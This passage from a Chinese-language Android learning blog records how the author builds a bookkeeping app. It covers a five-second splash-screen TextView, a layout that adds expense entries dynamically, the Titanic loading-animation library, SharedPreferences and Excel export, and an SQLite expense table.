title="开屏展示"></a>开屏展示</h2><p>目前我要做的第一件事情就是开发一个开屏展示，我希望打开软件的时候，先展示一个页面，几秒中后关闭页面，展示软件主页内容。</p><p>这个开屏可以用于，显示广告，显示LOGO，显示教程等等等。</p><p>编写逻辑：我首先编写一个组件，目前我使用的是TextView，文本组件，然后创建一个对应的类继承这个组件，当加载这个组件的时候，有一个计时器倒数五秒后，隐藏本组件。</p><p>代码：</p><p>页面端：</p><figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:app</span>=<span class="string">"http://schemas.android.com/apk/res-auto"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:tools</span>=<span class="string">"http://schemas.android.com/tools"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">"@+id/main"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">tools:context</span>=<span class="string">".MainActivity"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">com.example.financing.TextViewLain</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/tv_one"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:background</span>=<span class="string">"#3488B5"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:ellipsize</span>=<span class="string">"marquee"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:focusable</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:textSize</span>=<span class="string">"50dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:focusableInTouchMode</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:gravity</span>=<span class="string">"center"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:marqueeRepeatLimit</span>=<span class="string">"marquee_forever"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:singleLine</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"@string/lain"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:textColor</span>=<span class="string">"@color/black"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:textStyle</span>=<span class="string">"italic"</span>&gt;</span><span class="tag">&lt;/<span class="name">com.example.financing.TextViewLain</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"hello"</span></span></span><br><span class="line"><span class="tag">        &gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">TextView</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>JAVA端:</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.financing;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.util.AttributeSet;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"><span class="keyword">import</span> android.os.Handler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.annotation.Nullable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TextViewLain</span> <span class="keyword">extends</span> <span class="title class_">TextView</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TextViewLain</span><span class="params">(Context context)</span> {</span><br><span class="line">        <span class="built_in">super</span>(context);</span><br><span class="line">        init();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TextViewLain</span><span class="params">(Context context, <span class="meta">@Nullable</span> AttributeSet attrs)</span> {</span><br><span class="line">        <span class="built_in">super</span>(context, attrs);</span><br><span class="line">        init();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TextViewLain</span><span class="params">(Context context, <span class="meta">@Nullable</span> AttributeSet attrs, <span class="type">int</span> defStyleAttr)</span> {</span><br><span class="line">        <span class="built_in">super</span>(context, attrs, defStyleAttr);</span><br><span class="line">        init();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> {</span><br><span class="line">        <span class="comment">// 设置TextViewLain为获取焦点状态</span></span><br><span class="line">        setFocusable(<span class="literal">true</span>);</span><br><span class="line">        setFocusableInTouchMode(<span class="literal">true</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onAttachedToWindow</span><span class="params">()</span> {</span><br><span class="line">        <span class="built_in">super</span>.onAttachedToWindow();</span><br><span class="line">        <span class="comment">// 在5秒后执行关闭或隐藏操作</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Handler</span>().postDelayed(<span class="keyword">new</span> <span class="title class_">Runnable</span>() {</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> {</span><br><span class="line">                <span class="comment">// 在这里添加关闭或隐藏组件的代码</span></span><br><span class="line">                <span class="comment">// 如果要隐藏组件，可以使用setVisibility(View.GONE);</span></span><br><span class="line">                <span class="comment">// 如果要关闭组件，可以使用setVisibility(View.INVISIBLE); 或者从父布局中移除组件</span></span><br><span class="line">                <span class="comment">// 例如：getParent().removeView(TextViewLain.this);</span></span><br><span class="line">                <span class="comment">// 这里仅提供示例代码，请根据您的需求进行相应修改</span></span><br><span class="line">                TextViewLain.<span class="built_in">this</span>.setVisibility(GONE);</span><br><span class="line">            }</span><br><span class="line">        }, <span class="number">5000</span>); <span class="comment">// 5000毫秒 = 5秒</span></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">//    重写</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isFocused</span><span class="params">()</span> {</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>至此，实现了我需要的效果，但我认为这个消失转场有些生硬，之后有机会修改一下。</p><p>之所以五秒后显示Hello，则是利用了从上往下渲染的规则，开屏的View遮住了Hello，只有View消失后才能显示Hello。</p><p>开屏展示后期完成数据展示的逻辑后，会将比较常用的数据直接展示，如收入，支出等等，当然可以自定义，也可以取消展示。</p><p>但目前先显示品牌LOGO。</p><h2 id="基础记账"><a href="#基础记账" class="headerlink" title="基础记账"></a>基础记账</h2><p>制作基础记账功能首先分析需求。</p><p>首先需要一个输入框可以输入文本，然后需要一个添加按钮，点击按钮的时候会读取输入框里的内容，和目前已经有的数据做加法运算。</p><p>显示运算结果需要两个TextView，用来显示两个数据，第一个是总和，第二个是每次相加的结果，这样可以看到自己目前花了多少钱，和每笔详细的消费。</p><p>第一个显示数据好做，创建一个TextView，然后用set方法直接修改组件的默认Text就可以。瓦问题是第二个显示，因为要显示多个内容，所以必须每次添加后创建一个新的TextView，用来显示当前一笔的详细消费。</p><p>这里在我查阅资料后想出了这种写法。</p><figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">androidx.constraintlayout.widget.ConstraintLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:app</span>=<span class="string">"http://schemas.android.com/apk/res-auto"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:tools</span>=<span class="string">"http://schemas.android.com/tools"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">"@+id/main"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">tools:context</span>=<span class="string">".MainActivity"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">com.example.financing.TextViewLain</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/tv_one"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"0dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:background</span>=<span class="string">"#3488B5"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:ellipsize</span>=<span class="string">"marquee"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:focusable</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:focusableInTouchMode</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:gravity</span>=<span class="string">"center"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:marqueeRepeatLimit</span>=<span class="string">"marquee_forever"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:singleLine</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"@string/lain"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:textColor</span>=<span class="string">"@color/black"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:textSize</span>=<span class="string">"24sp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:textStyle</span>=<span class="string">"italic"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintEnd_toEndOf</span>=<span class="string">"parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintStart_toStartOf</span>=<span class="string">"parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintTop_toTopOf</span>=<span class="string">"parent"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">EditText</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/edit_text"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"0dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginStart</span>=<span class="string">"16dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginTop</span>=<span class="string">"40dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginEnd</span>=<span class="string">"16dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:hint</span>=<span class="string">"输入金额"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintEnd_toEndOf</span>=<span class="string">"parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintStart_toStartOf</span>=<span class="string">"parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintTop_toBottomOf</span>=<span class="string">"@id/tv_one"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/btn_sum"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"100dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"60dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginTop</span>=<span class="string">"16dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:background</span>=<span class="string">"#4BC0FF"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"添加"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:textColor</span>=<span class="string">"#FFFFFF"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintEnd_toEndOf</span>=<span class="string">"parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintHorizontal_bias</span>=<span class="string">"0.5"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintStart_toStartOf</span>=<span class="string">"parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintTop_toBottomOf</span>=<span class="string">"@id/edit_text"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/text_num"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"0dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginStart</span>=<span class="string">"16dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginTop</span>=<span class="string">"16dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginEnd</span>=<span class="string">"16dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"0"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintEnd_toEndOf</span>=<span class="string">"parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintStart_toStartOf</span>=<span class="string">"parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintTop_toBottomOf</span>=<span class="string">"@id/btn_sum"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">ScrollView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"0dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"0dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintBottom_toBottomOf</span>=<span class="string">"parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintEnd_toEndOf</span>=<span class="string">"parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintStart_toStartOf</span>=<span class="string">"parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintTop_toBottomOf</span>=<span class="string">"@id/text_num"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">LinearLayout</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:id</span>=<span class="string">"@+id/main_line"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_marginTop</span>=<span class="string">"16dp"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:orientation</span>=<span class="string">"vertical"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">tools:layout_editor_absoluteX</span>=<span class="string">"0dp"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">                <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">                <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">                <span class="attr">android:text</span>=<span class="string">"添加数据"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">&lt;!-- Add more views here if needed --&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ScrollView</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    &lt;TextView--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        android:layout_width="match_parent"--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        android:layout_height="30dp"--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        android:text="@string/app_v"--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        android:textSize="20dp"--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        android:textColor="#FF0000"--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &gt;--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--    &lt;/TextView&gt;--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">androidx.constraintlayout.widget.ConstraintLayout</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>从这段代码中，可以看到我在父容器ConstraintLayout里又创建了一个LinearLayout，因为在我想的时候我发现xml本质上和HTML差不多，而我的预想是为了保持布局的设计，我需要多个BOX，每个Box显示不同的内容，所以就有个这个内容器。</p><p>然后这个容器外面有一个ScrollView，这个标签的作用是为了判断，如果容器内的组件占满后，会出现滚动条，用来往下滑动以持续显示数据。</p><p>就这样，完成了页面的构建，虽然简陋，但在目前而言，我的目的主要是为了高效的学习。</p><p>至于逻辑部分的代码，我是这样写的</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.financing;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.view.ViewGroup;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.LinearLayout;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.activity.EdgeToEdge;</span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> androidx.constraintlayout.widget.ConstraintLayout;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> {</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> {</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        EdgeToEdge.enable(<span class="built_in">this</span>);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        获取按钮</span></span><br><span class="line">        <span class="type">Button</span> <span class="variable">btn_sum</span> <span class="operator">=</span> findViewById(R.id.btn_sum);</span><br><span class="line"><span class="comment">//        获取文本框内容</span></span><br><span class="line">        <span class="type">EditText</span> <span class="variable">edit_text</span> <span class="operator">=</span> findViewById(R.id.edit_text);</span><br><span class="line"><span class="comment">//        获取保存的数据</span></span><br><span class="line">        <span class="type">TextView</span> <span class="variable">text_num</span> <span class="operator">=</span> findViewById(R.id.text_num);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        btn_sum.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() {</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> {</span><br><span class="line">                <span class="comment">// 在按钮点击事件中执行你想要的操作</span></span><br><span class="line">                <span class="comment">// 获取文本框中的内容</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">editTextContent</span> <span class="operator">=</span> edit_text.getText().toString();</span><br><span class="line">                <span class="comment">// 获取 TextView 中的文本</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">textViewContent</span> <span class="operator">=</span> text_num.getText().toString();</span><br><span class="line"></span><br><span class="line"><span class="comment">//                获取要添加的组件的容器</span></span><br><span class="line">                <span class="type">LinearLayout</span> <span class="variable">container</span> <span class="operator">=</span> findViewById(R.id.main_line);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (editTextContent.isEmpty()){</span><br><span class="line">                    Log.d(<span class="string">"TAG"</span>,<span class="string">"报错:输入为空"</span>);</span><br><span class="line"></span><br><span class="line">                }<span class="keyword">else</span> {</span><br><span class="line">                    <span class="comment">// 将字符串转换为 double 类型</span></span><br><span class="line">                    <span class="type">double</span> <span class="variable">editTextValue</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">try</span> {</span><br><span class="line">                        editTextValue = Double.parseDouble(editTextContent);</span><br><span class="line">                        <span class="comment">// 在这里处理转换成功的情况</span></span><br><span class="line">                    } <span class="keyword">catch</span> (NumberFormatException e) {</span><br><span class="line">                        <span class="comment">// 在这里处理转换失败的情况，即输入不是有效的数字或小数</span></span><br><span class="line">                        Log.d(<span class="string">"TAG"</span>, <span class="string">"报错:输入不是有效的数字或小数"</span>);</span><br><span class="line">                    }</span><br><span class="line">                    <span class="type">double</span> <span class="variable">textViewValue</span> <span class="operator">=</span> Double.parseDouble(textViewContent);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 计算总和</span></span><br><span class="line">                    <span class="type">double</span> <span class="variable">sum</span> <span class="operator">=</span> editTextValue + textViewValue;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 将结果显示在 TextView 中</span></span><br><span class="line">                    text_num.setText(String.valueOf(sum));</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 清空文本框内容</span></span><br><span class="line">                    edit_text.setText(<span class="string">""</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="type">TextView</span> <span class="variable">textView</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TextView</span>(MainActivity.<span class="built_in">this</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//设置点击按钮后要添加的内容</span></span><br><span class="line">                    textView.setText(editTextContent);</span><br><span class="line">                    textView.setTextSize(<span class="number">30</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//                    textView.setLayoutParams(new LinearLayout.LayoutParams(</span></span><br><span class="line"><span class="comment">//                            ViewGroup.LayoutParams.WRAP_CONTENT,</span></span><br><span class="line"><span class="comment">//                            LinearLayout.LayoutParams.WRAP_CONTENT));</span></span><br><span class="line"></span><br><span class="line">                    container.addView(textView);</span><br><span class="line">                }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            }</span><br><span class="line">        });</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>大概就是获取这三个组件，然后依次做出操作，值得一讲的是，这个自动创建组件的功能，可以new出组件后，先对组件设置相关必要参数，然后添加到容器中，这个容器就是我创建LinearLayout的原因，如果直接将组件添加到父容器中，那么布局就会重叠变乱，而我设定好LinearLayout后，少了很多不必要的麻烦，容器会对里面添加的组件排版，然后每行显示一条数据。</p><h2 id="美观的加载画面"><a href="#美观的加载画面" class="headerlink" title="美观的加载画面"></a>美观的加载画面</h2><p>今天在论坛中看到了一个他人推荐的github项目 Titanic for Android。</p><p>大概原理我推断，通过读取字体文件ttf后，然后使用着色器美化动态效果，然后调用组件。</p><p>官方文档:</p><p>How to use</p><p>Add a <code>TitanicTextView</code> to your layout:</p><figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">com.romainpiel.titanic.TitanicTextView</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">"@+id/titanic_tv"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:text</span>=<span class="string">"@string/loading"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:textColor</span>=<span class="string">"#212121"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:textSize</span>=<span class="string">"70sp"</span>/&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>To start the animation:</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line">titanic = <span class="keyword">new</span> <span class="title class_">Titanic</span>();</span><br><span class="line">titanic.start(myTitanicTextView);</span><br></pre></td></tr></tbody></table></figure><p>You may want to keep track of the titanic instance after the animation is started if you want to stop it.</p><p>To stop it:</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line">titanic.cancel();</span><br></pre></td></tr></tbody></table></figure><p>将这个项目添加到自己的项目来实现这个功能。</p><h2 id="数据的保存和转换"><a href="#数据的保存和转换" class="headerlink" title="数据的保存和转换"></a>数据的保存和转换</h2><p>通过使用SharedPreferences保存数据然后使用org.apache.poi依赖将数据转换成excol。</p><p>org.apache.poi报错，当前版本无法适配，切换org.apache.poi的版本号后成功运行，或者修改minskd也可以，但这样会让一些手机无法卡退。</p><h2 id="创建一个数据库用来存储"><a href="#创建一个数据库用来存储" class="headerlink" title="创建一个数据库用来存储"></a>创建一个数据库用来存储</h2><p>虽然使用上面的方法也能够存储数据，但是面对大量需要索引的数据时，就显得没有那么方便和迅速，对于这个对象只适合存放一些日常的数据，面对大量需要检索的数据时，则需要数据库。</p><p>首先需要设计几个表，这里比如我设计出了一个支出表，它拥有以下列：</p><ol><li>id: 整型，主键，具有自动增量属性，用于唯一标识每个支出记录。</li><li>amount: 实数，用于存储支出金额。</li><li>category: 文本，用于存储支出的类别或类型。</li><li>date: 日期，用于存储支出发生的日期。</li><li>transaction_method: 文本，用于存储支付方式或交易方式。</li><li>account: 文本，用于存储支出所使用的账户信息。</li><li>payee: 文本，用于存储收款人或收款机构的信息。</li><li>location: 文本，用于存储支出发生的地点或位置信息。</li><li>attachment: 文本，用于存储任何附加文件或照片的路径或链接。</li><li>notes: 文本，用于存储关于支出的任何备注或说明。</li></ol><p>然后根据设计好的表去创建：</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">"CREATE TABLE expenditure ("</span> +</span><br><span class="line">             <span class="string">"id INTEGER PRIMARY KEY AUTOINCREMENT,"</span> +</span><br><span class="line">             <span class="string">"amount REAL,"</span> +</span><br><span class="line">             <span class="string">"category TEXT,"</span> +</span><br><span class="line">             <span class="string">"date DATE,"</span> +</span><br><span class="line">             <span class="string">"transaction_method TEXT,"</span> +</span><br><span class="line">             <span class="string">"account TEXT,"</span> +</span><br><span class="line">             <span class="string">"payee TEXT,"</span> +</span><br><span class="line">             <span class="string">"location TEXT,"</span> +</span><br><span class="line">             <span class="string">"attachment TEXT,"</span> +</span><br><span class="line">             <span class="string">"notes TEXT)"</span>;</span><br><span class="line">     db.execSQL(sql);</span><br><span class="line"> }</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>多多理财</title>
      <link href="/NANABLOG/2024/04/15/%E5%A4%9A%E5%A4%9A%E7%90%86%E8%B4%A2/"/>
      <url>/NANABLOG/2024/04/15/%E5%A4%9A%E5%A4%9A%E7%90%86%E8%B4%A2/</url>
      
